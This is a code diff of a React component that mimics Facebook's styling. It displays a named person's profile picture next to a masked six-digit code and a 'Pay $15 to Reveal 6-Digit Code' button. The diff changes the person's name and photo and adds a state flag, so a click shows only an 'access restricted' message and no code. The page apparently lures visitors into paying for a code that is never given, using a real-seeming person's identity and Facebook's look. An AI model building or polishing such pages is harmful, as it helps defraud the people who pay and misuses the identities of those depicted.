@@ -1,12 +1,15 @@
 'use client';
 
-export default function SixDigit() {
+import { useState } from "react";
+
+export default function SixDigitCode() {
     const code = '******';
+    const [paid, setPaid] = useState(false);
 
     const fbUser = {
-        name: 'Sanjida Mim',
+        name: 'Nur Alam',
         profilePic:
-            'https://scontent.frjh7-1.fna.fbcdn.net/v/t1.6435-9/36795511_117304302517433_2255713804497190912_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeGQ0TyHWrYJpNHXasnPebu2YHNYsNC5a8xgc1iw0LlrzCUJrFXqJLL0wo-URWLCVQ70kHnpu3U1rVWd1ITTLtZk&_nc_ohc=xiBHGY_rNr0Q7kNvwFo8iRW&_nc_oc=AdkoIO7kr4Ny-vTpfh9fBDHA8YloPqg56m8uNvIxzf_OBoXWC-AsA5OB7cpJ4_1-AnkDUEDQmKO4pr7py107W5_F&_nc_zt=23&_nc_ht=scontent.frjh7-1.fna&_nc_gid=Yby6jWOAxYt-0Bh4xJNqBw&oh=00_AfOqfkoySiaVLjjOgw1EJMS5xor-w3Y_kTYi9eAm9IMLSQ&oe=687B5270',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRGCg4pLQ1ckWPPMqf4s4eLyiKKMUU9bpjtA&s',
     };
 
     return (
@@ -56,11 +59,23 @@ export default function SixDigit() {
 
                 {/* Payment Button */}
                 <button
-                    onClick={() => { }}
+                    onClick={() => setPaid(true)}
                     className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
                 >
                     Pay $15 to Reveal 6-Digit Code
                 </button>
+
+
+
+                {/* Confirmation */}
+                {paid && (
+                    <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
+                        <p className="text-sm font-medium">
+                            Access restricted to registered users only..
+                        </p>
+
+                    </div>
+                )}
             </div>
         </div>
     );
